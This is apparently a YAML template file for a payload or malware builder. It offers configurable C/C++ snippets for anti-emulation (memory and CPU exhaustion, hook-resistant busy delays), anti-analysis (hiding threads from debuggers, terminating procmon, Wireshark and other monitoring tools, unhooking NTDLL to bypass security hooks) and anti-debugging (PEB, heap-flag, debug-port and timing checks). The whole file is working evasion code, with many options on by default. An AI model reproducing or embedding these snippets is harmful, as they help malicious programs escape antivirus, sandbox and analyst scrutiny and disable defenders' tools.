sections:
- header: Anti Emulation
  template: antiemulation
  display: Anti-Emulation
  allowMultiple: true
  items:
  - id: None
    display: None (Skip)
    default: false
    snippet: |
      // No anti-emulation
  - id: SirAllocALot
    display: SirAllocALot (Memory Exhaustion)
    default: true
    inputs:
    - id: sir_alloc_count
      label: "Allocation Count"
      type: textbox
      defaultValue: "100"
      placeholder: "100"
    - id: sir_iteration_count
      label: "Iterations"
      type: textbox
      defaultValue: "5"
      placeholder: "5"
    - id: sir_alloc_size
      label: "Alloc Size (bytes)"
      type: textbox
      defaultValue: "4096"
      placeholder: "4096"
    snippet: |
      // Anti-emulation: Exhaust emulator with memory allocations
      // Allocates many RW regions, sets to RX, then frees - repeated multiple times
      // This overwhelms AV emulators (memory limits, API call limits, or time limits)
      {
          const int SIR_ALLOC_COUNT = $sir_alloc_count$;
          const int SIR_ITERATION_COUNT = $sir_iteration_count$;
          const int ALLOC_SIZE = $sir_alloc_size$;
          void* allocs[$sir_alloc_count$];
          DWORD result;

          for(int i = 0; i < SIR_ITERATION_COUNT; i++) {
              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                  allocs[n] = VirtualAlloc(NULL, ALLOC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                  if (allocs[n]) {
                      char *ptr = (char*)allocs[n];
                      for(int j = 0; j < ALLOC_SIZE; j++) {
                          ptr[j] = 0x23;
                      }
                  }
              }

              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                  if (allocs[n]) {
                      VirtualProtect(allocs[n], ALLOC_SIZE, PAGE_EXECUTE_READ, &result);
                  }
              }

              for(int n = 0; n < SIR_ALLOC_COUNT; n++) {
                  if (allocs[n]) {
                      VirtualFree(allocs[n], 0, MEM_RELEASE);
                  }
              }
          }
      }
  - id: TimeRawKernel
    display: Time Delay (Kernel Time Register)
    default: false
    inputs:
    - id: time_raw_kernel_ms
      label: "Delay (ms)"
      type: textbox
      defaultValue: "3000"
      placeholder: "3000"
    snippet: |
      // Anti-emulation: Busy sleep using kernel time register
      // Uses memory address 0x7ffe0004 which is not affected by Sleep() hooks
      {
          auto get_time_raw = []() -> DWORD {
              ULONG* PUserSharedData_TickCountMultiplier = (ULONG*)0x7ffe0004;
              LONG* PUserSharedData_High1Time = (LONG*)0x7ffe0324;
              ULONG* PUserSharedData_LowPart = (ULONG*)0x7ffe0320;
              DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time << 8) +
                  ((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) >> 24);
              return kernelTime;
          };

          auto sleep_raw_ms = [&get_time_raw](DWORD sleeptime) {
              DWORD start = get_time_raw();
              while (get_time_raw() - start < sleeptime) {}
          };

          sleep_raw_ms($time_raw_kernel_ms$);
      }
  - id: DelayExecNtDelayExecution
    display: Delay via NtDelayExecution
    default: false
    inputs:
    - id: nt_delay_seconds
      label: "Delay (seconds)"
      type: textbox
      defaultValue: "5"
      placeholder: "5"
    snippet: |
      // Anti-emulation: Direct syscall delay that cannot be easily hooked
      {
          typedef NTSTATUS (NTAPI *pNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtDelayExecution NtDelayExec = (pNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
              if (NtDelayExec) {
                  LARGE_INTEGER delay;
                  delay.QuadPart = -(LONGLONG)$nt_delay_seconds$ * 10000000LL; // seconds to 100ns intervals (negative = relative)
                  NtDelayExec(FALSE, &delay);
              }
          }
      }
  - id: HeavyComputation
    display: Heavy Computation (CPU Exhaustion)
    default: false
    inputs:
    - id: heavy_comp_iterations
      label: "Iterations"
      type: textbox
      defaultValue: "50000000"
      placeholder: "50000000"
    snippet: |
      // Anti-emulation: Heavy computation to exhaust emulator cycles
      {
          volatile unsigned int result = 0;
          for (unsigned int i = 0; i < $heavy_comp_iterations$; i++) {
              result ^= i;
              result = (result << 1) | (result >> 31);
              result += i * 7;
          }
          // Use result to prevent optimization
          if (result == 0xDEADBEEF) return 1;
      }
  - id: FlsCallbacks
    display: FLS Callback Abuse
    default: false
    snippet: "// Anti-emulation: Abuse FLS (Fiber Local Storage) callbacks\n// Many emulators don't properly implement FLS callbacks\n{\n    volatile BOOL flsCalled = FALSE;\n    auto flsCallback = [](PVOID lpFlsData) -> VOID {\n        *(volatile BOOL*)lpFlsData = TRUE;\n    };\n    \n    DWORD flsIndex = FlsAlloc((PFLS_CALLBACK_FUNCTION)flsCallback);\n    if (flsIndex != FLS_OUT_OF_INDEXES) {\n        FlsSetValue(flsIndex, (PVOID)&flsCalled);\n        FlsFree(flsIndex);\n        \n        if (!flsCalled) {\n            // FLS callback wasn't called - likely in emulator\n            return 0;\n        }\n    }\n}\n"
  - id: MaxMemoryExhaustion
    display: Maximum Memory Exhaustion
    default: true
    inputs:
    - id: max_mem_count
      label: "Allocation Count"
      type: textbox
      defaultValue: "250"
      placeholder: "250"
    - id: max_mem_iters
      label: "Iterations"
      type: textbox
      defaultValue: "15"
      placeholder: "15"
    - id: max_mem_size
      label: "Alloc Size (bytes)"
      type: textbox
      defaultValue: "32768"
      placeholder: "32768"
    snippet: "// Maximum memory allocation stress\n{\n    const int COUNT = $max_mem_count$;\n    const int ITERS = $max_mem_iters$;\n    const int SIZE = $max_mem_size$;\n    void* allocs[$max_mem_count$];\n    DWORD prot;\n    \n    for(int iter = 0; iter < ITERS; iter++) {\n        for(int n = 0; n < COUNT; n++) {\n            allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (allocs[n]) {\n                volatile BYTE *p = (BYTE*)allocs[n];\n                for(int j = 0; j < SIZE; j += 256) {\n                    p[j] = (BYTE)((j * iter) ^ n);\n                }\n            }\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);\n        }\n    }\n}\n"
  - id: ExtendedTimeDelay
    display: Extended Time Delay
    default: true
    inputs:
    - id: ext_delay_ms
      label: "Delay (ms)"
      type: textbox
      defaultValue: "15000"
      placeholder: "15000"
    snippet: |
      // Busy delay to defeat time-limited emulators
      {
          DWORD start = *(DWORD*)0x7ffe0320;
          while (*(DWORD*)0x7ffe0320 - start < $ext_delay_ms$) {
              volatile int x = 0;
              for (int i = 0; i < 10000; i++) x += i;
          }
      }
  - id: CpuStress
    display: CPU Stress Test
    default: true
    inputs:
    - id: cpu_stress_iterations
      label: "Iterations"
      type: textbox
      defaultValue: "200000000"
      placeholder: "200000000"
    snippet: |
      // Heavy CPU computation
      {
          volatile unsigned int r = 0xDEADBEEF;
          for (unsigned int i = 0; i < $cpu_stress_iterations$; i++) {
              r = (r << 1) | (r >> 31);
              r ^= i;
              r = (r * 7) + 13;
          }
          if (r == 0) Sleep(1);
      }
  - id: FLSStress
    display: FLS Callback Stress
    default: false
    snippet: |
      // Stress FLS callbacks
      {
          for (int round = 0; round < 50; round++) {
              volatile BOOL called = FALSE;
              auto cb = [](PVOID p) -> VOID { *(volatile BOOL*)p = TRUE; };
              DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
              if (idx != FLS_OUT_OF_INDEXES) {
                  FlsSetValue(idx, (PVOID)&called);
                  FlsFree(idx);
                  if (!called) return 0;
              }
          }
      }
  - id: ExtremeSirAlloc
    display: Extreme Memory Exhaustion
    default: true
    inputs:
    - id: extreme_alloc_count
      label: "Allocation Count"
      type: textbox
      defaultValue: "200"
      placeholder: "200"
    - id: extreme_alloc_iters
      label: "Iterations"
      type: textbox
      defaultValue: "10"
      placeholder: "10"
    - id: extreme_alloc_size
      label: "Alloc Size (bytes)"
      type: textbox
      defaultValue: "16384"
      placeholder: "16384"
    snippet: "// Extreme memory allocation to crash emulators\n{\n    const int COUNT = $extreme_alloc_count$;\n    const int ITERS = $extreme_alloc_iters$;\n    void* allocs[$extreme_alloc_count$];\n    DWORD prot;\n    \n    for(int iter = 0; iter < ITERS; iter++) {\n        for(int n = 0; n < COUNT; n++) {\n            allocs[n] = VirtualAlloc(NULL, $extreme_alloc_size$, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            if (allocs[n]) {\n                volatile BYTE *p = (BYTE*)allocs[n];\n                for(int j = 0; j < $extreme_alloc_size$; j += 128) {\n                    p[j] = (BYTE)(j ^ iter ^ n);\n                }\n            }\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualProtect(allocs[n], $extreme_alloc_size$, PAGE_EXECUTE_READ, &prot);\n        }\n        for(int n = 0; n < COUNT; n++) {\n            if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);\n        }\n    }\n}\n"
  - id: LongDelay
    display: Extended Time Delay
    default: false
    inputs:
    - id: long_delay_ms
      label: "Delay (ms)"
      type: textbox
      defaultValue: "10000"
      placeholder: "10000"
    snippet: |
      // Busy delay to defeat time-limited emulators
      {
          DWORD start = *(DWORD*)0x7ffe0320;
          while (*(DWORD*)0x7ffe0320 - start < $long_delay_ms$) {
              volatile int x = 0;
              for (int i = 0; i < 1000; i++) x += i;
          }
      }
  - id: TimeRaw
    display: Kernel Time Delay
    default: true
    inputs:
    - id: time_raw_ms
      label: "Delay (ms)"
      type: textbox
      defaultValue: "5000"
      placeholder: "5000"
    snippet: |
      // Busy wait using kernel time register
      {
          auto get_time = []() -> DWORD {
              return *(DWORD*)0x7ffe0320;
          };
          DWORD start = get_time();
          while (get_time() - start < $time_raw_ms$) {}
      }
  - id: CpuIntensive
    display: CPU Exhaustion
    default: false
    inputs:
    - id: cpu_intensive_iterations
      label: "Iterations"
      type: textbox
      defaultValue: "100000000"
      placeholder: "100000000"
    snippet: |
      // Heavy computation to exhaust emulator cycles
      {
          volatile unsigned int r = 0x12345678;
          for (unsigned int i = 0; i < $cpu_intensive_iterations$; i++) {
              r = (r << 1) | (r >> 31);
              r ^= i;
          }
          if (r == 0) Sleep(1);
      }
- header: Anti Analysis
  template: antianalysis
  display: Anti-Analysis
  allowMultiple: true
  items:
  - id: HideThread
    display: Hide From Debugger
    default: true
    snippet: |
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0);
      }
  - id: TerminateAnalysis
    display: Terminate Analysis Tools
    default: false
    snippet: "{\n    const wchar_t* targets[] = {\n        L\"procmon.exe\", L\"procexp.exe\", L\"wireshark.exe\", \n        L\"fiddler.exe\", L\"ProcessHacker.exe\"\n    };\n    \n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe = {sizeof(pe)};\n        if (Process32FirstW(snap, &pe)) {\n            do {\n                for (int i = 0; i < 5; i++) {\n                    if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {\n                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);\n                        if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }\n                    }\n                }\n            } while (Process32NextW(snap, &pe));\n        }\n        CloseHandle(snap);\n    }\n}\n"
  - id: KillAnalysisTools
    display: Terminate Analysis Processes
    default: true
    snippet: "// Actively terminate analysis tools\n{\n    const wchar_t* targets[] = {\n        L\"procmon.exe\", L\"procexp.exe\", L\"procexp64.exe\",\n        L\"Wireshark.exe\", L\"fiddler.exe\", L\"tcpview.exe\",\n        L\"autoruns.exe\", L\"filemon.exe\", L\"regmon.exe\",\n        L\"ProcessHacker.exe\", L\"perfmon.exe\"\n    };\n    \n    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (snap != INVALID_HANDLE_VALUE) {\n        PROCESSENTRY32W pe = {sizeof(pe)};\n        if (Process32FirstW(snap, &pe)) {\n            do {\n                for (int i = 0; i < 11; i++) {\n                    if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {\n                        HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);\n                        if (hp) {\n                            TerminateProcess(hp, 0);\n                            CloseHandle(hp);\n                        }\n                    }\n                }\n            } while (Process32NextW(snap, &pe));\n        }\n        CloseHandle(snap);\n    }\n}\n"
  - id: UnhookNtdll
    display: NTDLL Unhooking
    default: false
    snippet: "// Unhook NTDLL by mapping fresh copy from disk\n{\n    HANDLE hFile = CreateFileW(L\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", \n                               GENERIC_READ, FILE_SHARE_READ, NULL, \n                               OPEN_EXISTING, 0, NULL);\n    if (hFile != INVALID_HANDLE_VALUE) {\n        HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n        if (hMap) {\n            PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);\n            if (pClean) {\n                HMODULE hNtdll = GetModuleHandleW(L\"ntdll.dll\");\n                PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;\n                PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);\n                \n                PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);\n                for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {\n                    if (memcmp(pSec[i].Name, \".text\", 5) == 0) {\n                        DWORD oldProt;\n                        PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);\n                        PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);\n                        VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);\n                        memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);\n                        VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);\n                        break;\n                    }\n                }\n                UnmapViewOfFile(pClean);\n            }\n            CloseHandle(hMap);\n        }\n        CloseHandle(hFile);\n    }\n}\n"
  - id: HideFromDebugger
    display: Hide Thread From Debugger
    default: false
    snippet: |
      // Use NtSetInformationThread to hide from debugger
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) {
              // ThreadHideFromDebugger = 0x11
              NtSIT(GetCurrentThread(), 0x11, NULL, 0);
          }
      }
- header: Anti Debugging
  template: antidebugging
  display: Anti-Debugging
  allowMultiple: true
  items:
  - id: None
    display: None (Skip)
    default: false
    snippet: |
      // No anti-debugging
  - id: IsDebuggerPresent
    display: IsDebuggerPresent API
    default: true
    snippet: |
      // Anti-debug: Check IsDebuggerPresent
      if (IsDebuggerPresent()) {
          return 0;
      }
  - id: CheckRemoteDebuggerPresent
    display: CheckRemoteDebuggerPresent API
    default: false
    snippet: |
      // Anti-debug: Check for remote debugger
      {
          BOOL debuggerPresent = FALSE;
          if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
              if (debuggerPresent) {
                  return 0;
              }
          }
      }
  - id: PebBeingDebugged
    display: PEB BeingDebugged Flag
    default: false
    snippet: |
      // Anti-debug: Direct PEB check
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          #endif
          if (pPeb->BeingDebugged) {
              return 0;
          }
      }
  - id: NtGlobalFlag
    display: NtGlobalFlag Check
    default: false
    snippet: |
      // Anti-debug: Check NtGlobalFlag in PEB
      // Debuggers set heap flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
      {
          #ifdef _WIN64
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
          #else
          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
          #endif
          if (*pNtGlobalFlag & 0x70) { // FLG_HEAP_* flags
              return 0;
          }
      }
  - id: HeapFlags
    display: Heap Flags Check
    default: false
    snippet: |
      // Anti-debug: Check heap flags set by debugger
      {
          #ifdef _WIN64
          PPEB pPeb = (PPEB)__readgsqword(0x60);
          PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
          #else
          PPEB pPeb = (PPEB)__readfsdword(0x30);
          PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
          #endif
          if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
              return 0;
          }
      }
  - id: CloseHandleException
    display: CloseHandle Invalid Handle
    default: false
    snippet: |
      // Anti-debug: CloseHandle with invalid handle causes exception under debugger
      __try {
          CloseHandle((HANDLE)0xDEADBEEF);
      }
      __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
          // Exception caught = debugger present
          return 0;
      }
  - id: OutputDebugString
    display: OutputDebugString Error Check
    default: false
    snippet: |
      // Anti-debug: OutputDebugString sets error differently when debugger present
      {
          SetLastError(0);
          OutputDebugStringA("Test");
          if (GetLastError() == 0) {
              // Debugger consumed the string
              return 0;
          }
      }
  - id: HardwareBreakpoints
    display: Hardware Breakpoints Detection
    default: false
    snippet: |
      // Anti-debug: Check for hardware breakpoints via debug registers
      {
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
                  return 0;
              }
          }
      }
  - id: TimingRdtsc
    display: RDTSC Timing Check
    default: false
    snippet: "// Anti-debug: Timing check using RDTSC\n// Debugger stepping causes significant delay\n{\n    unsigned __int64 start = __rdtsc();\n    \n    // Small operation\n    volatile int x = 0;\n    for (int i = 0; i < 100; i++) x++;\n    \n    unsigned __int64 end = __rdtsc();\n    \n    // Threshold for normal execution (adjust based on CPU)\n    if ((end - start) > 0x100000) {\n        return 0;\n    }\n}\n"
  - id: NtQueryInformationProcess
    display: NtQueryInformationProcess Debug Port
    default: false
    snippet: |
      // Anti-debug: Query debug port via NtQueryInformationProcess
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  HANDLE debugPort = NULL;
                  NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL); // ProcessDebugPort = 7
                  if (status == 0 && debugPort != NULL) {
                      return 0;
                  }
              }
          }
      }
  - id: ParentProcessCheck
    display: Parent Process Check
    default: false
    snippet: |
      // Anti-debug: Check if parent process is a known debugger
      {
          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
          if (ntdll) {
              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
              if (NtQIP) {
                  struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
                  if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
                      HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
                      if (hParent) {
                          WCHAR parentName[MAX_PATH] = {0};
                          DWORD size = MAX_PATH;
                          if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
                              _wcslwr_s(parentName, MAX_PATH);
                              if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
                                  wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
                                  wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
                                  CloseHandle(hParent);
                                  return 0;
                              }
                          }
                          CloseHandle(hParent);
                      }
                  }
              }
          }
      }
  - id: TrapFlag
    display: Trap Flag Detection
    default: false
    snippet: |
      // Anti-debug: Single-step trap flag detection
      #ifdef _M_IX86
      __try {
          __asm {
              pushfd
              or dword ptr [esp], 0x100 ; Set trap flag
              popfd
              nop
          }
      }
      __except(EXCEPTION_EXECUTE_HANDLER) {
          goto trap_ok;
      }
      return 0;
      trap_ok:;
      #else
      // x64: Use NtSetInformationThread to hide from debugger
      {
          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0); // ThreadHideFromDebugger
      }
      #endif
  - id: FullAntiDebug
    display: Full Anti-Debug Suite
    default: true
    snippet: "// Complete anti-debug implementation\n{\n    // 1. IsDebuggerPresent\n    if (IsDebuggerPresent()) ExitProcess(0);\n    \n    // 2. CheckRemoteDebuggerPresent\n    BOOL remote = FALSE;\n    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);\n    if (remote) ExitProcess(0);\n    \n    // 3. PEB flags\n    #ifdef _WIN64\n    PPEB peb = (PPEB)__readgsqword(0x60);\n    DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);\n    #else\n    PPEB peb = (PPEB)__readfsdword(0x30);\n    DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);\n    #endif\n    if (peb->BeingDebugged) ExitProcess(0);\n    if (ntg & 0x70) ExitProcess(0);\n    \n    // 4. Hardware breakpoints\n    CONTEXT ctx = {0};\n    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;\n    GetThreadContext(GetCurrentThread(), &ctx);\n    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);\n    \n    // 5. RDTSC timing\n    unsigned __int64 t1 = __rdtsc();\n    volatile int x = 0; for (int i = 0; i < 100; i++) x++;\n    if (__rdtsc() - t1 > 0x100000) ExitProcess(0);\n    \n    // 6. Debug port\n    typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);\n    pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtQueryInformationProcess\");\n    if (NtQIP) {\n        HANDLE port = NULL;\n        NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);\n        if (port) ExitProcess(0);\n        \n        ULONG flags = 0;\n        NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags\n        if (flags == 0) ExitProcess(0);\n    }\n    \n    // 7. OutputDebugString\n    SetLastError(0);\n    OutputDebugStringA(\"X\");\n    if (GetLastError() == 0) ExitProcess(0);\n}\n"
  - id: AllChecks
    display: All Anti-Debug Checks
    default: true
    snippet: |
      // Comprehensive anti-debugging
      {
          // API checks
          if (IsDebuggerPresent()) ExitProcess(0);
          BOOL dbg = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
          if (dbg) ExitProcess(0);

          // PEB checks
          #ifdef _WIN64
          PPEB peb = (PPEB)__readgsqword(0x60);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0xBC);
          #else
          PPEB peb = (PPEB)__readfsdword(0x30);
          PDWORD ntg = (PDWORD)((PBYTE)peb + 0x68);
          #endif
          if (peb->BeingDebugged) ExitProcess(0);
          if (*ntg & 0x70) ExitProcess(0);

          // Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          GetThreadContext(GetCurrentThread(), &ctx);
          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);

          // Timing check
          unsigned __int64 t = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t > 0x100000) ExitProcess(0);

          // Debug port
          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
          if (NtQIP) {
              HANDLE port = NULL;
              if (NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port) ExitProcess(0);
          }
      }
  - id: LayeredChecks
    display: Layered Debugger Detection
    default: true
    snippet: |
      // Multiple anti-debug checks
      {
          // Check 1: IsDebuggerPresent
          if (IsDebuggerPresent()) return 0;

          // Check 2: Remote debugger
          BOOL remote = FALSE;
          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
          if (remote) return 0;

          // Check 3: PEB flag
          #ifdef _WIN64
          if (((PPEB)__readgsqword(0x60))->BeingDebugged) return 0;
          #else
          if (((PPEB)__readfsdword(0x30))->BeingDebugged) return 0;
          #endif

          // Check 4: Hardware breakpoints
          CONTEXT ctx = {0};
          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
          if (GetThreadContext(GetCurrentThread(), &ctx)) {
              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;
          }

          // Check 5: Timing
          unsigned __int64 t1 = __rdtsc();
          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
          if (__rdtsc() - t1 > 0x100000) return 0;
      }
